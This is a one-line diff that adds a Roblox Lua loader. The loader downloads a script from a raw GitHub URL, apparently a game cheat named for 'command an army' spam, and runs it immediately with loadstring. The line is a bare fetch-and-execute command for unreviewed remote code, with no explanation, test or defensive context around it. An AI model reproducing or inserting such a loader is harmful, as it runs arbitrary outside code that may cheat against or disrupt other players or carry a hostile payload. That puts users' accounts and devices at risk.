@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/upd-command-an-army-spam5-vbxnoybqh09mtc.lua"))()
